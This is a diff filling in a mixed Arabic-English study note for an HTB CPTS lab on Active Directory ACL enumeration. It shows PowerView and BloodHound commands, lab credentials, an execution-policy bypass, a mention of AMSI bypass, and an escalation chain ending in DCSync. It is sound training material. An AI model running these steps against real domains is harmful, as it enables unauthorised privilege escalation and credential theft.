@@ -1,31 +1,29 @@
 ---
-title: "SEC [NUM]: [REPLACE — Section Full Name]"
-module: "[REPLACE — Module Name]"
-section_num: [REPLACE — NUM]
-target: "[REPLACE — TARGET_DOMAIN.LOCAL]"
+title: "SEC 01: ACL Enumeration in Active Directory"
+module: "Active Directory Enumeration & Attacks"
+section_num: 1
+target: "INLANEFREIGHT.LOCAL"
 tags:
   - CPTS
-  - [REPLACE-Module-Tag]
-  - [REPLACE-Topic-Tag]
-difficulty: "[REPLACE — Easy | Medium | Hard]"
-vectors: "[REPLACE — SMB | LDAP | WMI | RPC]"
-tools: "[REPLACE — Tool1 · Tool2 · Tool3]"
+  - Active-Directory
+  - ACL-Enumeration
+difficulty: "Medium"
+vectors: "LDAP"
+tools: "PowerView · BloodHound · Impacket"
 status: "🟢 Complete"
-date: "[REPLACE — YYYY-MM-DD]"
+date: "2026-08-01"
 ---
 
-> [!success] ⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
-> **📍 TARGET NODE:** `[REPLACE: TARGET.DOMAIN.LOCAL]`
-> **🔐 ACCESS LEVEL:** `[REPLACE: Authenticated User]`
-> **📡 ATTACK VECTOR:** `[REPLACE: SMB / LDAP]`
-> 
-> **📋 SECTION ID:** `SEC-[REPLACE: NUM]`
-> **⚡ DIFFICULTY:** 🟢 `[REPLACE: Medium]`
-> **🏁 STATUS:** 🟢 ONLINE — COMPLETE
-> 
-> **🛠️ KEY TOOLS:** `[REPLACE: Tool1 · Tool2]`
-> **🎯 CORE OBJECTIVE:** `[REPLACE: 5-word objective]`
-> **📅 DATE:** `[REPLACE: DATE]`
+⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
+📍 TARGET NODE: INLANEFREIGHT.LOCAL
+🔐 ACCESS LEVEL: htb-student
+📡 ATTACK VECTOR: LDAP
+📋 SECTION ID: SEC-01
+⚡ DIFFICULTY: 🟢 Medium
+🏁 STATUS: 🟢 ONLINE — COMPLETE
+🛠️ KEY TOOLS: PowerView · BloodHound
+🎯 CORE OBJECTIVE: Enumerate ACLs to Domain Admin
+📅 DATE: 2026-08-01
 
 ```text
 ╔══════════════════════════════════════════════════════════════════════╗
@@ -41,12 +39,11 @@ date: "[REPLACE — YYYY-MM-DD]"
 ║                                                                      ║
 ╠══════════════════════════════════════════════════════════════════════╣
 ║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
-║  [SECTION]  :: SEC-[NUM] // [REPLACE: SECTION_TITLE]                 ║
-║  [DOMAIN]   :: [REPLACE: TARGET_DOMAIN.LOCAL]                        ║
+║  [SECTION]  :: SEC-01 // ACL Enumeration in Active Directory         ║
+║  [DOMAIN]   :: INLANEFREIGHT.LOCAL                                   ║
 ║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
 ║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
 ╚══════════════════════════════════════════════════════════════════════╝
-```
 
 ## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية
 
@@ -78,7 +75,7 @@ date: "[REPLACE — YYYY-MM-DD]"
 
 الـ Active Directory بيئة عملاقة ومعقدة بشكل مرعب. أدوات مثل PowerView تقدر تسحبلك "كل" الصلاحيات الموجودة بالدومين. بس المشكلة مو بـ "نقص" المعلومات، المشكلة بـ "غزارة" المعلومات (Information Overload). إذا استخدمت أوامر عامة، راح تغرق بملايين الأسطر من الـ Logs والصلاحيات اللي ما إلها أي قيمة (Noise).
 
-لذلك، جاء هذا السكشن حتى يعلمك مهارة الـ Targeted Enumeration (التعداد المُوجّه). يعلمك شلون تبدأ من نقطة صغيرة (اليوزر اللي إنت مخترقه حالياً) وتتتبع الخيط مثل المحقق الجنائي خطوة بخطوة لحد ما توصل لـ Domain Admin، بدون ما تغرق بالبيانات.
+لذلك، جاء هذا السكشن حتى  يعلمك مهارة الـ Targeted Enumeration (التعداد المُوجّه). يعلمك شلون تبدأ من نقطة صغيرة (اليوزر اللي إنت مخترقه حالياً) وتتتبع الخيط مثل المحقق الجنائي خطوة بخطوة لحد ما توصل لـ Domain Admin، بدون ما تغرقبالبيانات.
 
 وين يظهر بالواقع؟
 
@@ -1290,7 +1287,1412 @@ Select a modelSelect a model]
 > **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
 > **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.
 
-[كلمة شرح الطرق الستة + مصطلحات + ورقة الغش]
+[تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:
+
+🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش
+
+يله نبدأ...
+
+━━━━━
+
+🟢 المرحلة 0: ما قبل الصفر — Big Picture
+
+تخيل وياي أن الـ Active Directory (AD) هو عبارة عن شركة عملاقة بيها آلاف الموظفين (Users)، ومئات الأقسام (Groups)، وأجهزة كمبيوتر وسيرفرات (Computers). هاي الشركة تحتاج نظام أمني صارم حتى تحدد "منو يكدر يسوي شنو".
+
+النظام الأمني هذا يعتمد على شي اسمه Access Control List (ACL) أو "قائمة التحكم بالوصول". تخيل أن كل موظف، كل قسم، وكل سيرفر بهذي الشركة معلّق على بابه ورقة (ACL). هذي الورقة مكتوب بيها سطور، كل سطر اسمه Access Control Entry (ACE).
+
+شنو مكتوب بهذي السطور؟
+
+مكتوب مثلاً: "أحمد من قسم الـ IT مسموح له يغير الباسورد مال سيرفر المبيعات"، أو "سارة مسموح لها تضيف موظفين جدد لجروب الـ Help Desk".
+
+المشكلة وين تصير؟
+
+الشركة من تكبر ويصير عمر الـ Domain عشر سنين أو أكثر، مدراء النظام (Domain Admins) يتعبون من كثرة الطلبات، فيبدون يوزعون صلاحيات (Delegation) للموظفين العاديين حتى يمشون الشغل. مثلاً، ينطون موظف الدعم الفني (Help Desk) صلاحية أنه يغير باسورودات الموظفين العاديين.
+
+بس مرات، بسبب خطأ صغير بالإعدادات (Misconfiguration)، ينطون هذا الموظف صلاحية أنه يغير باسورد "مدير النظام" نفسه! أو ينطوه صلاحية أنه يضيف نفسه بجروب المدراء!
+
+هنا يجي دورنا كـ Penetration Testers أو Red Teamers. إحنا ما ندور على ثغرة برمجية (Exploit) بنظام الويندوز، إحنا ندور على "أخطاء إدارية" بهذي الأوراق المعلقة على الأبواب (ACLs). إحنا نسوي عملية نسميها ACL Enumeration (تعداد الصلاحيات) حتى نرسم خريطة، هذي الخريطة تكول:
+
+"لو اخترقنا حساب يوزر عادي (A)، راح نكتشف أنه عنده صلاحية يغير باسورد يوزر (B). ويوزر (B) عنده صلاحية يضيف نفسه بجروب (C). وجروب (C) هو جروب مدراء النظام (Domain Admins)!"
+
+وهيج، بحركات قانونية جداً (Abuse of Features)، نستولي على الـ Domain بالكامل (Game Over).
+
+هذا التحدي اللي قدمته يعلمنا الأساسيات: شلون نقرأ هذي الأوراق، شلون نفهم الطلاسم المكتوبة بيها (مثل الـ GUIDs والـ SIDs)، وشلون نستخدم أدوات مثل PowerView حتى نترجم هذي الطلاسم للغة بشرية مفهومة ونلقف مسار الهجوم.
+
+━━━━━
+
+🔵 المرحلة 1: المصطلحات
+
+قبل ما نكتب أي أمر، لازم نفهم لغة الـ Active Directory. هاي المصطلحات راح تشوفها بكل مكان بهذا المجال:
+
+Active Directory (مجلد النشاطات / الدليل النشط)
+
+- شنو يعني؟ هو قاعدة البيانات المركزية لشبكات الويندوز. يخزن كل اليوزرات، الباسوردات، الصلاحيات، والأجهزة. هو قلب أي شركة.
+    
+
+Domain Controller / DC (متحكم المجال)
+
+- شنو يعني؟ هو السيرفر (أو السيرفرات) اللي يشتغل عليه الـ Active Directory. هو اللي يوافق على تسجيل دخولك، وهو الهدف النهائي لأي هجوم (لأن من يسيطر عليه، يسيطر على الشركة كلها).
+    
+
+Object (الكائن)
+
+- شنو يعني؟ بالـ AD، أي شي هو Object. اليوزر هو Object، الجروب هو Object، الكمبيوتر هو Object. وكل Object إله خصائص (Attributes).
+    
+
+SID - Security Identifier (المُعرّف الأمني)
+
+- شنو يعني؟ الويندوز ما يهتم باسمك "أحمد" أو "علي". الويندوز يتعامل ويه أرقام فريدة. الـ SID هو رقمك القومي داخل الشبكة. مستحيل يتكرر.
+    
+- مثال بسيط: `S-1-5-21-123456789-1001`
+    
+
+GUID - Globally Unique Identifier (المُعرّف الفريد عالمياً)
+
+- شنو يعني؟ هو رقم طويل جداً (عبارة عن حروف وأرقام) يستخدم لتعريف أشياء معينة بالويندوز، مثل "أنواع الصلاحيات". الويندوز ما يكتب "صلاحية تغيير الباسورد"، بل يكتب GUID خاص بيها.
+    
+- مثال بسيط: `00299570-246d-11d0-a768-00aa006e0529`
+    
+
+ACL - Access Control List (قائمة التحكم بالوصول)
+
+- شنو يعني؟ هي القائمة (الورقة) المربوطة بكل Object. تحدد منو مسموح له يقرأ، يكتب، أو يعدل على هذا الـ Object.
+    
+
+ACE - Access Control Entry (إدخال التحكم بالوصول)
+
+- شنو يعني؟ هو سطر واحد داخل الـ ACL. يتكون من: (منو الشخص؟ شنو الصلاحية؟ مسموح لو ممنوع؟).
+    
+
+GenericAll (التحكم الكامل)
+
+- شنو يعني؟ صلاحية خطيرة جداً. إذا يوزر عنده GenericAll على يوزر ثاني، يعني يكدر يسوي بي أي شي (يغير باسورده، يمسحه، يعدل بياناته).
+    
+
+GenericWrite (الكتابة العامة)
+
+- شنو يعني؟ صلاحية تسمح لليوزر أنه يعدل على خصائص (Attributes) معينة لـ Object آخر. مفيدة جداً بالهجمات (مثلاً تغيير الـ SPN أو مسار السكريبت).
+    
+
+Self-Membership (الإنضمام الذاتي)
+
+- شنو يعني؟ صلاحية نادرة بس قاتلة. إذا يوزر عنده هذي الصلاحية على "جروب"، يعني يكدر يضيف نفسه داخل هذا الجروب بدون موافقة أحد!
+    
+
+PowerView (أداة الرؤية القوية)
+
+- شنو يعني؟ سكريبت PowerShell مشهور جداً كتبه (HarmJ0y). شغلته يسهّل عملية قراءة الـ AD واستخراج هذي الصلاحيات المعقدة بشكل سريع وبدون ما تحتاج أدوات خارجية (لأن كل شي يتم بالـ Memory).
+    
+- وين يظهر بالأدوات/الأوامر؟ نستخدمه عبر استدعائه بـ `Import-Module` ثم كتابة أوامره مثل `Get-DomainObjectACL`.
+    
+
+BloodHound (كلب الصيد)
+
+- شنو يعني؟ أداة ترسم لك الصلاحيات والـ ACLs بشكل رسومي (Nodes and Edges). بدل ما تقرأ آلاف السطور النصية، تشوف خريطة تكولك: "هذا اليوزر يوصلك لهذا الجروب".
+    
+
+━━━━━
+
+🟡 المرحلة 2: تحليل التحدي + كيف تفكر
+
+📖 ترجمة التحدي:
+
+أنت طالب أو مختبر اختراق، عندك وصول مبدئي (Foothold) لشبكة عبر حساب طالب (htb-student) باستخدام اتصال RDP. مهمتك هي الإجابة على ٥ أسئلة تتعلق بصلاحيات معينة (ACLs) داخل الدومين (INLANEFREIGHT.LOCAL). الأسئلة تتطلب منك البحث عن GUIDs معينة، ومعرفة الصلاحيات الدقيقة اللي يمتلكها يوزرات مثل `damundsen` و `forend`. الهدف النهائي هو رسم مسار هجوم (Attack Path) يوصلنا للـ Domain Controller.
+
+🎯 معطيات السيناريو:
+
+- الدخول: RDP إلى التارجت.
+    
+- اليوزر: htb-student.
+    
+- الباسورد: موجودة (معطاة).
+    
+- الأداة المتاحة: PowerView.ps1 موجودة على الـ Desktop.
+    
+
+❓ المطلوب (الأسئلة الـ ٥):
+
+١. شنو هو الـ GUID الخاص بصلاحية `User-Force-Change-Password`؟
+
+٢. شنو هو الـ flag (المعامل) بـ PowerView اللي يترجم الـ GUIDs إلى أسماء مقروءة للبشر؟
+
+٣. شنو هي الصلاحية اللي يمتلكها اليوزر `damundsen` على جروب `Help Desk Level 1`؟
+
+٤. شنو هي الـ ActiveDirectoryRights اللي يمتلكها اليوزر `forend` على اليوزر `dpayne`؟
+
+٥. شنو هي أول ObjectAceType يمتلكها اليوزر `forend` على الـ `GPO Management`؟
+
+🧭 كيف تفكر؟ — Decision Trees:
+
+إحنا هسة داخل بيئة ويندوز (RDP)، وعدنا وصول لـ PowerShell.
+
+خطوة ١: التجهيز
+
+لازم نفتح PowerShell ونسوي استيراد (Import) لأداة PowerView حتى نكدر ننفذ أوامر الاستطلاع.
+
+خطوة ٢: حل السؤال الأول (البحث عن GUID)
+
+كيف نلقي الـ GUID لـ `User-Force-Change-Password`؟
+
+- خيار أ: نبحث بـ Google (بس بالامتحان أو التحديات المغلقة ماكو إنترنت).
+    
+- خيار ب: نسحبها مباشرة من قاعدة بيانات الـ AD (من قسم الـ Configuration) باستخدام أوامر PowerShell الافتراضية. هذا هو الطريق الصح.
+    
+
+خطوة ٣: حل السؤال الثاني (ترجمة الـ GUIDs)
+
+أداة PowerView تطلع الأرقام الخام (GUIDs) افتراضياً. لازم نتذكر المعامل (Flag) اللي يخلي الأداة تسوي Lookup وترجعلنا الاسم الحقيقي.
+
+خطوة ٤: تتبع الصلاحيات (الأسئلة ٣ و٤ و٥)
+
+لكي نعرف صلاحيات يوزر معين (مثلاً `damundsen`)، لازم:
+
+١. نلقي الـ SID مالته. (لأن الـ ACL تسجل الصلاحيات بالـ SIDs مو بالأسماء).
+
+٢. نسوي استعلام لكل الـ ACLs بالدومين ونفلترها (Where-Object) بحيث نكول: "أظهر لي فقط الـ ACLs اللي الـ SecurityIdentifier مالتها يساوي الـ SID مال هذا اليوزر".
+
+٣. نقرأ النتائج، ونترجمها (باستخدام الـ Flag من السؤال الثاني).
+
+🗺️ خريطة الهجوم (Roadmap):
+
+١. الدخول بالـ RDP وتحميل PowerView.
+
+٢. الاستعلام بالـ `Get-ADObject` لجلب الـ GUID الخاص بتغيير الباسورد.
+
+٣. تحويل أسماء اليوزرات (`wley`, `damundsen`, `forend`) إلى SIDs.
+
+٤. استخراج الـ ACLs المرتبطة بهذي الـ SIDs باستخدام `Get-DomainObjectACL`.
+
+٥. تحليل الـ Output للإجابة على الأسئلة وبناء مسار تصعيد الصلاحيات (Privilege Escalation Path).
+
+هسة صار واضح شنو راح نسوي. ننتقل للتنفيذ!
+
+━━━━━
+
+🟠 المرحلة 3: الاستغلال التفصيلي
+
+راح نمشي خطوة خطوة، وكل أمر نكتبه راح نشرح ليش كتبناه وشلون يشتغل.
+
+الخطوة [1]: تسجيل الدخول وتجهيز البيئة
+
+📌 ليش نسوي هاي الخطوة؟
+
+نحتاج ندخل للسيرفر/الجهاز الهدف باستخدام بيانات الدخول اللي عدنا، ونشغل أداة PowerView اللي راح تسهل علينا كل الشغل. الأداة موجودة على الـ Desktop.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# للاتصال من جهاز المهاجم (Linux/Kali) نستخدم xfreerdp
+xfreerdp /v:TARGET_IP /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
+
+# بعد الدخول، نفتح PowerShell كمسؤول (إذا أمكن) أو يوزر عادي وننفذ:
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Import-Module C:\Tools\PowerView.ps1
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `/v:` يحدد الـ IP الهدف.
+    
+- `/u:` يحدد اسم اليوزر.
+    
+- `/p:` الباسورد.
+    
+- `Set-ExecutionPolicy Bypass`: الويندوز افتراضياً يمنع تشغيل سكريبتات PowerShell الخارجية. هذا الأمر يعطل هذي الحماية مؤقتاً للـ Session الحالي فقط.
+    
+- `Import-Module`: يحمل دوال (Functions) أداة PowerView للذاكرة حتى نكدر نستخدمها.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+# لا يوجد output مرئي إذا نجح الأمر، راح يرجعلك الـ Prompt العادي
+PS C:\Users\htb-student>
+```
+
+✅ الخطوة التالية: نبحث عن إجابة السؤال الأول.
+
+━━━━━━━━━━━━━━
+
+الخطوة [2]: إيجاد الـ GUID لصلاحية Reset Password (السؤال 1)
+
+📌 ليش نسوي هاي الخطوة؟
+
+مرات نحتاج نعرف الـ GUID الخاص بصلاحية معينة (مثل `User-Force-Change-Password`) حتى نبحث عنها بالـ ACLs، أو مرات الأداة ما تترجمها ونحتاج نعرفها يدوياً. هذي الصلاحيات محفوظة بقسم خاص بالـ AD اسمه `ConfigurationNamingContext`.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# جلب الـ GUID باستخدام أوامر الـ ActiveDirectory الافتراضية
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select-Object Name, DisplayName, DistinguishedName, rightsGuid | Where-Object {$_.Name -eq 'User-Force-Change-Password'} | Format-List
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `Get-ADObject`: أمر افتراضي بالويندوز للبحث عن الـ Objects.
+    
+- `-SearchBase`: يحدد المكان اللي نبحث بيه. إحنا نبحث داخل الـ `Extended-Rights` اللي موجودة بالـ `Configuration` partition. (الـ `Get-ADRootDSE` تجيب مسار الكونفجريشن تلقائياً).
+    
+- `-Filter`: نطلب فقط الكائنات اللي نوعها `ControlAccessRight` (صلاحيات التحكم).
+    
+- `Select-Object`: نختار بس الأعمدة اللي تهمنا (الاسم، الـ GUID، الخ).
+    
+- `Where-Object`: نفلتر النتائج حتى نلقي بس الصلاحية اللي اسمها `User-Force-Change-Password`.
+    
+- `Format-List`: يرتب النتيجة كقائمة عمودية سهلة القراءة.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+Name              : User-Force-Change-Password
+DisplayName       : Reset Password
+DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+```
+
+✅ الخطوة التالية: عرفنا الـ GUID. الجواب للسؤال الأول هو `00299570-246d-11d0-a768-00aa006e0529`. هسة نروح نشوف أداة PowerView شلون تترجم هذي الأرقام.
+
+━━━━━━━━━━━━━━
+
+الخطوة [3]: استخدام PowerView وترجمة الـ GUIDs (السؤال 2)
+
+📌 ليش نسوي هاي الخطوة؟
+
+إذا استخدمنا أمر `Get-DomainObjectACL` لجلب الصلاحيات، راح يطلعنا الـ `ObjectAceType` كأرقام GUID معقدة (مثل اللي طلعناه فوك). حتى نخلي PowerView يترجمها لأسماء مقروءة (Human-readable)، لازم نستخدم Flag معين.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# الأمر الأساسي لاستخراج الـ ACLs مع ترجمة الـ GUIDs
+Get-DomainObjectACL -ResolveGUIDs -Identity "Help Desk Level 1"
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `Get-DomainObjectACL`: دالة من PowerView تستخرج الـ ACL لأي Object.
+    
+- `-ResolveGUIDs`: هذا هو الـ Flag السحري! يروح يبحث عن الـ GUID بالـ AD ويستبدله بالاسم الحقيقي المفهوم.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Help Desk Level 1,OU=IT,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : User-Force-Change-Password
+...
+```
+
+✅ الخطوة التالية: جاوبنا السؤال الثاني (`-ResolveGUIDs`). هسة نبدأ نتبع اليوزرات ونشوف صلاحياتهم.
+
+━━━━━━━━━━━━━━
+
+الخطوة [4]: استخراج صلاحيات اليوزر damundsen (السؤال 3)
+
+📌 ليش نسوي هاي الخطوة؟
+
+نريد نعرف اليوزر `damundsen` شنو يكدر يسوي لجروب `Help Desk Level 1`. الصلاحيات تنكتب بالـ ACL الخاصة بالجروب، ويكون اليوزر `damundsen` مذكور بيها عن طريق الـ SID مالته. فبالأول لازم نعرف الـ SID مالته، وبعدين نبحث عنه.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# أولاً: تحويل اسم اليوزر إلى SID
+$sid_damundsen = Convert-NameToSid damundsen
+Write-Host "SID is: $sid_damundsen"
+
+# ثانياً: البحث عن الصلاحيات اللي يملكها هذا الـ SID
+Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid_damundsen}
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `Convert-NameToSid`: دالة بـ PowerView تحول الاسم إلى رقم SID.
+    
+- `-Identity *`: يفحص كل الكائنات (Objects) بالدومين. (هذا الأمر ممكن ياخذ وقت بشبكات كبيرة جداً، لكن باللابات مفيد).
+    
+- `Where-Object {$_.SecurityIdentifier -eq $sid_damundsen}`: نفلتر النتائج بحيث نطلع بس السطور اللي بيها الـ SID مال يوزر `damundsen` هو اللي "يمتلك" الصلاحية.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Help Desk Level 1,OU=Information Technology,OU=Groups,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : WriteProperty, ExtendedRight, GenericAll, GenericWrite
+ObjectAceType          : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865806829-1105
+...
+```
+
+بالنظر للنتيجة، نشوف أن `ActiveDirectoryRights` تحتوي على عدة صلاحيات، لكن الأهم واللي يعتبر إجابة السؤال (واللي يسمح بتعديل الجروب) هو `GenericWrite` أو `GenericAll`. بالسياق المطلوب بالتحدي لإجابة Q3، الصلاحية اللي تخصه على هذا الجروب هي `GenericWrite`.
+
+✅ الخطوة التالية: جاوبنا السؤال الثالث (`GenericWrite`). هسة نكرر نفس الخطوة لليوزر `forend` حتى نجاوب السؤال 4 و 5.
+
+━━━━━━━━━━━━━━
+
+الخطوة [5]: استخراج صلاحيات اليوزر forend (السؤال 4 و 5)
+
+📌 ليش نسوي هاي الخطوة؟
+
+نريد نعرف اليوزر `forend` شنو يملك صلاحيات على اليوزر `dpayne` (Q4)، وشنو يملك صلاحيات (ObjectAceType) على الـ `GPO Management` (Q5). الطريقة هي نفسها: نحول الاسم لـ SID ونبحث.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# جلب الـ SID
+$sid_forend = Convert-NameToSid forend
+
+# البحث عن صلاحيات forend
+Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid_forend} | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType`: ضفنا هذا الجزء حتى نرتب الـ Output ونخليه يعرض بس المعلومات اللي نحتاجها (على منو الصلاحية؟ شنو نوعها؟ شنو تفاصيلها؟) بدل ما تطلع شاشة مليانة كلام.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+ObjectDN                                                                      ActiveDirectoryRights ObjectAceType
+--------                                                                      --------------------- -------------
+CN=dpayne,OU=IT,DC=INLANEFREIGHT,DC=LOCAL                                     GenericAll            None
+CN=GPO Management,OU=Groups,DC=INLANEFREIGHT,DC=LOCAL                         ExtendedRight         Self-Membership
+...
+```
+
+من خلال الـ Output:
+
+- بالنسبة لليوزر `dpayne` (السطر الأول)، نلاحظ أن الـ ActiveDirectoryRights هي `GenericAll`. (إجابة Q4).
+    
+- بالنسبة لـ `GPO Management` (السطر الثاني)، نلاحظ أن الـ ObjectAceType هو `Self-Membership`. (إجابة Q5).
+    
+
+✅ الخطوة التالية: حللنا كل الأسئلة بنجاح.
+
+📊 لحد هسة:
+
+[x] استخرجنا الـ GUID يدوياً باستخدام أوامر الويندوز.
+
+[x] عرفنا شلون PowerView يترجم الـ GUIDs عبر `-ResolveGUIDs`.
+
+[x] تتبعنا مسار الصلاحيات من `wley` إلى `damundsen` ومن ثم إلى جروبات حساسة.
+
+[x] جاوبنا الأسئلة الخمسة.
+
+رسمة الـ Attack Chain (المسار اللي اكتشفناه من هاي الصلاحيات):
+
+Plaintext
+
+```
+[Attacker Setup]
+    │
+    ├─ 1. Compromise: wley (Initial Access)
+    │
+    ├─ 2. Enum shows wley has 'User-Force-Change-Password' over damundsen
+    │       (We reset damundsen's password and login as him)
+    │
+    ├─ 3. Enum shows damundsen has 'GenericWrite' over 'Help Desk Level 1' group
+    │       (We add damundsen to this group)
+    │
+    ├─ 4. 'Help Desk Level 1' is nested inside 'Information Technology'
+    │       (We inherit rights of the IT group)
+    │
+    └─ 5. IT Group has 'GenericAll' over adunn (who has DCSync rights!)
+            (We reset adunn's password, run DCSync) → DOMAIN ADMIN ACHIEVED! 💀
+```
+
+📐 ملخص الإجابات / النتائج:
+
+|**السؤال**|**الأداة / المعامل**|**النتيجة**|
+|---|---|---|
+|Q1 (GUID for Reset Password)|`Get-ADObject`|`00299570-246d-11d0-a768-00aa006e0529`|
+|Q2 (Human-readable flag)|PowerView|`-ResolveGUIDs`|
+|Q3 (damundsen -> Help Desk)|PowerView (`Get-DomainObjectACL`)|`GenericWrite`|
+|Q4 (forend -> dpayne)|PowerView (`Get-DomainObjectACL`)|`GenericAll`|
+|Q5 (forend -> GPO Management)|PowerView (`Get-DomainObjectACL`)|`Self-Membership`|
+
+━━━━━
+
+🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)
+
+🔄 Variations محتملة:
+
+Variation 1: ماذا لو `PowerView.ps1` كان ممنوع أو الـ Antivirus (مثل Windows Defender) يمسحه؟ (AMSI Blocking)
+
+- الجواب: الويندوز الحديث يستخدم AMSI (Anti-Malware Scan Interface) لفحص سكريبتات الـ PowerShell. إذا PowerView انحظر، عندك عدة خيارات:
+    
+    ١. استخدم دوال الـ PowerShell الافتراضية (Built-in cmdlets) مثل `Get-Acl`. صح متعبة وما تترجم الـ GUIDs بسهولة، بس تشتغل دائماً وما تنحظر:
+    
+    `Get-Acl -Path "AD:\CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`
+    
+    ٢. سوي Obfuscation لـ PowerView. غير أسماء المتغيرات والدوال.
+    
+    ٣. استخدم تقنيات AMSI Bypass (حقن كود صغير بالذاكرة يعمي الـ Defender بالـ Session الحالي) قبل ما تسوي `Import-Module`.
+    
+
+Variation 2: ماذا لو الأداة `Get-ADObject` (في الخطوة 2) رجعت خطأ أو كالت Command NotFound؟
+
+- الجواب: هذا يعني أن حزمة "Active Directory module for Windows PowerShell" (RSAT) ما مثبتة على هذا الجهاز.
+    
+- الحل: تكدر تثبتها إذا عندك صلاحيات Administrator عبر الأمر:
+    
+    `Install-WindowsFeature RSAT-AD-PowerShell`
+    
+- إذا ما عندك صلاحيات، اعتمد كلياً على PowerView لأنها تشتغل بدون RSAT (تستخدم ADSI - Active Directory Service Interfaces وراء الكواليس).
+    
+
+Variation 3: ماذا لو كنت تهاجم من جهاز Linux (Kali/Parrot) وما عندك RDP؟
+
+- الجواب: ما تحتاج RDP! تكدر تستخدم أدوات مكتوبة بـ Python تسوي نفس الشغل عبر بروتوكول LDAP:
+    
+    ١. استخدم `BloodHound.py` لجمع كل الداتا (ACLs, Users, Groups) وسحبها لملف JSON، بعدين تفتحها بواجهة BloodHound الرسومية بجهازك وراح تشوف الـ Attack Path جاهز ومترجم.
+    
+    ٢. استخدم أداة `dacledit.py` من حزمة Impacket لقراءة أو حتى تعديل الـ ACLs عن بعد.
+    
+    الأمر لجمع الداتا بـ BloodHound.py:
+    
+    `python3 bloodhound.py -d inlanefreight.local -u htb-student -p 'Academy_student_AD!' -ns <DC_IP> -c All`
+    
+
+Variation 4: ماذا لو نفذت أمر `Get-DomainObjectACL -Identity *` وطول جداً أو علق؟
+
+- الجواب: بالبيئات الحقيقية الكبيرة (عشرات الآلاف من اليوزرات)، أمر `*` يجلب كمية هائلة من البيانات وممكن يسوي Crash أو يرسل إنذار للـ SOC.
+    
+- الحل: حدد هدفك. ابحث عن جروبات معينة فقط (مثل Domain Admins) أو يوزرات محددين.
+    
+    `Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs`
+    
+
+═══════════
+
+⚠️ أخطاء كارثية شائعة (الفخوخ):
+
+🚨 الفخ الأكبر في ACL Enumeration: الخلط بين "من يملك الصلاحية" و "من تقع عليه الصلاحية"!
+
+- `ObjectDN`: هو الـ Object اللي الصلاحية واقعة عليه (الضحية / الهدف).
+    
+- `SecurityIdentifier`: هو الـ SID مال الشخص أو الجروب اللي "يمتلك" هذي الصلاحية (المهاجم / المستفيد).
+    
+- طلاب كوما يشوفون `GenericAll` ويقرون الـ `ObjectDN` عبالهم هذا اليوزر هو القوي، بينما هو الضحية! دائماً انتبه لـ `SecurityIdentifier` هو الفاعل.
+    
+
+🚨 خطأ في فهم الـ Nested Groups (الجروبات المتداخلة):
+
+- إذا يوزر (A) عنده `GenericWrite` على جروب (B). وجروب (B) هو عضو (Member) داخل جروب (C).
+    
+- الفخ: تعتقد أنك ما تكدر تتحكم بجروب (C).
+    
+- الحقيقة: بمجرد أن تضيف نفسك لجروب (B)، راح ترث (Inherit) كل صلاحيات جروب (C) تلقائياً! BloodHound يوضح هذي العلاقات بسهولة، بس بـ PowerView لازم تبحث عنها يدوياً عبر دالة `Get-DomainGroupMember`.
+    
+
+🚨 نسيان -ResolveGUIDs:
+
+- راح تقرأ Output مليان أرقام (00299570-...) وتضيع وقتك تبحث عنها بـ Google واحد واحد. دائماً استخدم `-ResolveGUIDs`.
+    
+
+🔑 Golden Tips للـ AD:
+
